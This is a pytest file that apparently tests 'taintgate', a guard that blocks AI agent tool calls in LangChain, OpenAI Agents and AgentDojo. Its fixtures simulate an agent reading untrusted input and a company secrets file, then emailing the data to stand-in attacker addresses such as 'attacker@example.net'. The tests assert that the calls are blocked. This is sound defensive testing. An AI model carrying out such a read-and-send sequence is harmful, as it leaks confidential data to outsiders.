"""Unit tests for Python framework wrappers (LangChain, OpenAI Agents, AgentDojo)."""

import pytest
from taintgate.core.policy.parser import parse_policy
from taintgate.core.policy.evaluator import PolicyEvaluator
from taintgate.session.context import SessionTracker
from taintgate.core.labels import LABEL_UNTRUSTED_PUBLIC, LABEL_TRUSTED_SECRET
from taintgate.integrations.langchain import wrap_tool, TaintGateSecurityError
from taintgate.integrations.openai_agents import TaintGateReActMediator
from taintgate.integrations.agentdojo import TaintGateDojoPipelineElement

TEST_POLICY = """
labels:
  integrity: [trusted, endorsed, untrusted]
  confidentiality: [public, internal, secret]

tools:
  fs.read_file:
    effect: read
    output:
      integrity: trusted
      confidentiality: internal
    overrides:
      - path: "**/company/secrets/**"
        confidentiality: secret
  fs.write_file:
    effect: local_write
  email.send:
    effect: external
    recipients_arg: to

policy:
  preset: rule_of_two
  rules:
    - deny: external
      when: data.confidentiality >= internal and recipient not in contacts
"""


def test_langchain_wrapper_benign_allowed():
    config = parse_policy(TEST_POLICY)
    evaluator = PolicyEvaluator(config)
    session = SessionTracker(evaluator=evaluator)

    def write_report(path: str, content: str) -> str:
        return f"Wrote {len(content)} bytes to {path}"

    wrapped = wrap_tool(write_report, session=session, tool_name="fs.write_file")
    result = wrapped(path="report.txt", content="Weekly report")
    assert "Wrote" in result


def test_langchain_wrapper_exfil_blocked():
    config = parse_policy(TEST_POLICY)
    evaluator = PolicyEvaluator(config)
    session = SessionTracker(evaluator=evaluator)

    # Ingest untrusted input and secret data
    session.record_tool_result("fs.read_file", {"path": "resume.txt"}, LABEL_UNTRUSTED_PUBLIC)
    session.record_tool_result("fs.read_file", {"path": "~/company/secrets/q3.txt"}, LABEL_TRUSTED_SECRET)

    def send_email(to: str, body: str) -> str:
        return f"Sent to {to}"

    wrapped = wrap_tool(send_email, session=session, tool_name="email.send")

    with pytest.raises(TaintGateSecurityError) as exc_info:
        wrapped(to="attacker@example.net", body="Leaked secret")

    err = exc_info.value
    assert "BLOCKED" in str(err)
    assert err.decision.is_denied
    assert "Target Sink:" in err.explanation


def test_openai_react_mediator():
    config = parse_policy(TEST_POLICY)
    evaluator = PolicyEvaluator(config)
    session = SessionTracker(evaluator=evaluator)
    mediator = TaintGateReActMediator(session)

    # Benign call
    dec1 = mediator.intercept_tool_call("fs.read_file", {"path": "notes.txt"})
    assert dec1.is_allowed

    # Simulate observation
    mediator.record_tool_observation("fs.read_file", {"path": "notes.txt"}, "Notes content")

    # Ingest untrusted taint
    session.record_tool_result("web.fetch", {}, LABEL_UNTRUSTED_PUBLIC)
    session.record_tool_result("fs.read_file", {"path": "~/company/secrets/q3.txt"}, LABEL_TRUSTED_SECRET)

    # Denied call
    dec2 = mediator.intercept_tool_call("email.send", {"to": "evil@attacker.com", "body": "data"})
    assert dec2.is_denied


def test_agentdojo_pipeline_element():
    config = parse_policy(TEST_POLICY)
    evaluator = PolicyEvaluator(config)
    dojo_element = TaintGateDojoPipelineElement(evaluator=evaluator)

    # Benign call
    allowed, err, dec = dojo_element.filter_tool_call("fs.read_file", {"path": "readme.txt"})
    assert allowed is True
    assert err is None

    # Taint session
    dojo_element.session.record_tool_result("web.fetch", {}, LABEL_UNTRUSTED_PUBLIC)
    dojo_element.session.record_tool_result("fs.read_file", {"path": "~/company/secrets/q3.txt"}, LABEL_TRUSTED_SECRET)

    # Malicious call
    allowed, err, dec = dojo_element.filter_tool_call("email.send", {"to": "attacker@example.net", "body": "secrets"})
    assert allowed is False
    assert "Operation blocked by TaintGate" in err
    assert dec.is_denied

    # Reset
    dojo_element.reset_session()
    allowed_after, _, _ = dojo_element.filter_tool_call("fs.read_file", {"path": "readme.txt"})
    assert allowed_after is True
